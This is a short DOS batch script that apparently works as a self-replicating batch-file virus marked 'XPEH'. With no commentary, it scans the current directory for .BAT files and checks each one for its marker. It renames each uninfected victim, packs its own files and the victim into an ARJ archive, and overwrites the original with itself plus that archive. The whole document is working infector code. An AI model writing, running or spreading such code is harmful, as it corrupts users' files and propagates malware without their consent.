@echo off
if "%1"=="XPEH" goto infect
for %%i in (*.BAT) do call XPEH01.BAT XPEH %%i
goto end
:infect
find "XPEH"<%2>nul
if not errorlevel 1 goto end
ren %2 XPEH02.BAT
arj a DUMB.ARJ XPEH01.BAT XPEH02.BAT XPEH03.BAT>nul
copy /b XPEH03.BAT+DUMB.ARJ %2>nul
del DUMB.ARJ
del XPEH02.BAT
:end